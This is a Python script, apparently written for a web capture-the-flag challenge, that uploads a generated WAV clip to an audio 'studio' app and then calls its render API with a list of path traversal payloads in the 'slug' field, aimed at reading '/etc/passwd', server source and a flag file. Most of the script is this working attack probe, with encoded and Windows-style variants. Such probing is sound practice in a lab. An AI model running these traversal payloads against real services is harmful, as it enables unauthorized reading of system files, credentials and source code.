#!/usr/bin/env python3
import io, json, re, struct, urllib.request, urllib.error, http.cookiejar

BASE = "https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
opener.addheaders = [("User-Agent", "Mozilla/5.0 studio")]

def do(path, data=None, headers=None, method=None):
    r = urllib.request.Request(BASE + path, data=data, method=method)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    try:
        resp = opener.open(r, timeout=60)
        return resp.status, dict(resp.getheaders()), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()

def txt(b, n=1500):
    try: return b.decode("utf-8", "replace")[:n]
    except: return repr(b[:n])

def make_wav(seconds=1, rate=8000):
    import math
    n = seconds * rate
    frames = b"".join(struct.pack("<h", int(3000*math.sin(2*math.pi*220*i/rate))) for i in range(n))
    hdr = b"RIFF" + struct.pack("<I", 36+len(frames)) + b"WAVE"
    hdr += b"fmt " + struct.pack("<IHHIIHH", 16, 1, 1, rate, rate*2, 2, 16)
    hdr += b"data" + struct.pack("<I", len(frames))
    return hdr + frames

def multipart(fields, files):
    boundary = "----wbnd7392xk"
    body = io.BytesIO()
    for k, v in fields.items():
        body.write(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode())
    for k, (fn, ct, content) in files.items():
        body.write(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"; filename=\"{fn}\"\r\nContent-Type: {ct}\r\n\r\n".encode())
        body.write(content); body.write(b"\r\n")
    body.write(f"--{boundary}--\r\n".encode())
    return body.getvalue(), f"multipart/form-data; boundary={boundary}"

# establish session
st, h, b = do("/studio")
print("studio", st, "cookie:", h.get("Set-Cookie",""))
# extract workspace id from page
ws = re.search(r"Workspace <span class=\"mono\">([^<]+)</span>", txt(b, 5000))
print("workspace:", ws.group(1) if ws else None)

# 1. upload a clip
wav = make_wav()
body, ct = multipart({}, {"clip": ("clip.wav", "audio/wav", wav)})
st, h, b = do("/studio/upload", data=body, headers={"Content-Type": ct}, method="POST")
print("\n=== UPLOAD", st, "===")
print("headers:", json.dumps({k:h[k] for k in h if k.lower() in ('content-type','location')}))
print(txt(b, 2000))

# 2. render normal
def render(slug, theme="midnight"):
    payload = json.dumps({"slug": slug, "theme": theme}).encode()
    st, h, b = do("/api/render", data=payload, headers={"Content-Type": "application/json"}, method="POST")
    return st, h, b

st, h, b = render("audiogram")
print("\n=== RENDER normal", st, "===")
print(txt(b, 2000))
try:
    j = json.loads(b)
    print("PARSED:", j)
    url = j.get("url") or (j.get("poster") or {}).get("url")
    if url:
        st2, h2, b2 = do(url)
        print("poster GET", url, "->", st2, h2.get("Content-Type"), "len", len(b2))
except Exception as e:
    print("not json:", e)

# 3. traversal probes in slug
print("\n=== TRAVERSAL SLUG PROBES ===")
for slug in ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd",
             "....//....//....//etc/passwd", "../../server.js", "../../../app/flag.txt",
             "../../flag", "test/../../../etc/passwd", "..\\..\\..\\etc\\passwd",
             "%2e%2e/%2e%2e/etc/passwd"]:
    st, h, b = render(slug)
    print(f"\n-- slug={slug!r} -> {st}")
    print(txt(b, 900))

print("\nDONE")
